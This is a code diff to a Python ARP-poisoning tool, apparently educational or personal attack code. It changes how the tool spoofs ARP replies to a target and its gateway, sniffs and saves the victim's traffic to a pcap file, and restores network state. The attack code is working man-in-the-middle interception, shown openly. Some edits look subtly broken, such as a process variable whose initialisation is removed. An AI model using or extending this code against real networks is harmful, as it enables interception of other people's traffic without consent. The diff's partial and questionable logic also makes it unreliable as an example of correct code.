@@ -67,6 +67,7 @@ class Arper:
             attacker = ActiveAttacker() if self.active else PassiveAttacker()
             attacker = ActiveAttacker()    # passive strategy temporarily unavailable
             attacker.start(self)
+        return self.target_mac
 
             
 class ActiveAttacker:
@@ -94,22 +95,19 @@ class ActiveAttacker:
         print(poison_gateway.summary())
         print('-' * 30)
         print('Beginning the ARP poison. [CTRL-C to stop]')
-
+        signal.signal(signal.SIGINT, signal.SIG_DFL)
         while not event.is_set():
             sys.stdout.write('.')
             sys.stdout.flush()
             sendp(poison_target)
             sendp(poison_gateway)
             event.wait(arper.delay)
-        self.restore(arper)
 
     def sniff_and_store(self, arper: Arper):
         print(f'Sniffing {arper.count} packets')
         bpf_filter = f'host {arper.target} and not arp'
-        signal.signal(signal.SIGINT, signal.SIG_DFL)
+        signal.signal(signal.SIGINT, handle_sigint)
         packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)    # The sniff function can handle KeyboardInterrupt
-        if arper.poison_event.is_set():
-            print('Aborted')
         arper.poison_event.set()
         wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
         print(f'Got {len(packets)} packets')
@@ -146,7 +144,6 @@ class ActiveAttacker:
                 count=5)
     
     def start(self, arper:Arper):
-        poison_process = None
         try:
             arper.sniff_process = Process(target=self.sniff_and_store, args=[arper])
             arper.sniff_process.start()
@@ -157,13 +154,11 @@ class ActiveAttacker:
         except (KeyboardInterrupt, Exception) as e:
             if isinstance(e, KeyboardInterrupt):
                 print('Aborted')
+        else:
             arper.poison_event.set()
+            poison_process.join()
         finally:
-            arper.poison_event.set()
-            if arper.sniff_process.is_alive():
-                arper.sniff_process.terminate()
-            if poison_process and poison_process.is_alive():
-                poison_process.terminate()
+            self.restore(arper)
             
 
 class PassiveAttacker:
@@ -204,6 +199,9 @@ class PassiveAttacker:
             except:
                 pass
 
+def handle_sigint(signum, frame):
+    raise KeyboardInterrupt
+
 class Context:
     def __enter__(self):
         with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
@@ -214,8 +212,9 @@ class Context:
         return self
     
     def __exit__(self, exc_type, exc_val, exc_tb):
-        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
-            f.write(self.original_value + '\n')
+        if self.original_value != '1':
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write(self.original_value + '\n')
 
 
 if __name__ == '__main__':
